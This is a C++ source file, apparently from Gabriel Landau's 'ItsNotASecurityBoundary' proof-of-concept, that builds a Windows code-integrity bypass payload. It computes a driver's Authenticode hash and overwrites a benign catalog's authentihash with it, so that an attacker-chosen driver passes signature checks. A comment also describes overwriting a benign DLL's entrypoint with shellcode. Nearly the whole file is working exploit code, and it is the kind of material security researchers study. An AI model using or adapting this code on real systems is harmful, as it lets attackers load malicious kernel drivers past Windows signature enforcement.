// ItsNotASecurityBoundary by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "Payload.h"
#include "resource.h"
#include "Logging.h"
#include "PayloadUtils.h"
#include <stdio.h>
#include <DbgHelp.h>
#include <string>
#include <bcrypt.h>

static bool HexToBytes(const std::string& hex,
     std::string& bytes)
{
    if (0 != (hex.size() % 2))
    {
        return false;
    }
    for (size_t i = 0; i < hex.size(); i += 2)
    {
        const ULONG byteValue = strtoul(hex.substr(i, 2).c_str(), NULL, 16);
        if (byteValue > UCHAR_MAX)
        {
            Log(Error, "Hex conversion error");
            return false;
        }
        bytes.push_back((unsigned char)byteValue);
    }
    return true;
}

static bool GetAuthentihash(
    const std::wstring& filePath,
    std::string& hash)
{
    bool bResult = false;
    HCATADMIN hCatAdmin = NULL;
    DWORD dwHashSize = 0;
    HANDLE hFile = NULL;
    
    hash.clear();

    hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        Log(Error, "GetAuthentihash: CreateFileW failed with GLE %u", GetLastError());
        return false;
    }

    if (!CryptCATAdminAcquireContext2(&hCatAdmin, NULL, (wchar_t*)BCRYPT_SHA256_ALGORITHM, 0, 0))
    {
        Log(Error, "CryptCATAdminAcquireContext2 failed with GLE %u", GetLastError());
        return false;
    }

    (void)CryptCATAdminCalcHashFromFileHandle2(hCatAdmin, hFile, &dwHashSize, NULL, 0);
    if (0 == dwHashSize)
    {
        Log(Error, "CryptCATAdminAcquireContext2 failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    hash.resize(dwHashSize);
    if (!CryptCATAdminCalcHashFromFileHandle2(hCatAdmin, hFile, &dwHashSize, (PBYTE)&hash[0], 0))
    {
        Log(Error, "CryptCATAdminCalcHashFromFileHandle2 failed with GLE %u", GetLastError());
        goto Cleanup;
    }

    bResult = true;

Cleanup:
    if (hCatAdmin)
    {
        CryptCATAdminReleaseContext(hCatAdmin, 0);
    }
    if (INVALID_HANDLE_VALUE == hFile)
    {
        CloseHandle(hFile);
    }

    return bResult;
}

// Build a payload that consists of the given benign DLL with its entrypoint overwritten by our shellcode
bool BuildPayload(
    const std::wstring& driverPath,
    const std::string& benignBuffer,
    std::string & payloadBuffer,
    ULONGLONG& patchedRangeStart,
    ULONGLONG& patchedRangeEnd,
    const std::string& authentihashToReplace)
{
    std::string buf = benignBuffer; // copy
    std::string toReplaceBytes;
    std::string payloadBytes;
    size_t payloadInjectionCount = 0;

    if (!HexToBytes(authentihashToReplace, toReplaceBytes))
    {
        Log(Error, "HexToBytes failed to convert authentihash");
        return false;
    }

    if (!GetAuthentihash(driverPath, payloadBytes))
    {
        Log(Error, "Failed to compute authentihash of driver");
        return false;
    }

    if (toReplaceBytes.size() != payloadBytes.size())
    {
        Log(Error, "Payload authentihash length doesn't match target authentihash length.");
    }

    // Find a benign authentihash and replace it with our payload's
    for (size_t i = 0; i < buf.size() - toReplaceBytes.length(); i++)
    {
        if (0 == memcmp(&buf[i], &toReplaceBytes[0], toReplaceBytes.size()))
        {
            memcpy(&buf[i], &payloadBytes[0], payloadBytes.size());
            i += payloadBytes.size();
            payloadInjectionCount++;

            Log(Info, "Patched payload at offset %zu", i);
            if (0 == patchedRangeStart)
            {
                patchedRangeStart = i;
            }
            patchedRangeEnd = i + payloadBytes.size();
        }
    }

    // Round patched range start down to 32kb boundary
    patchedRangeStart &= (~0x7fff);
    patchedRangeEnd = (patchedRangeEnd + 32768) & (~0x7fff);
    Log(Info, "Payload patch range: %zu -> %zu", patchedRangeStart, patchedRangeEnd);

    if (0 == payloadInjectionCount)
    {
        Log(Error, "Failed to find target authentihash.  Catalog may be corrupted.");
        return false;
    }

    Log(Info, "Payload buffer is %zu bytes", buf.size());

    payloadBuffer = std::move(buf);

    return true;
}
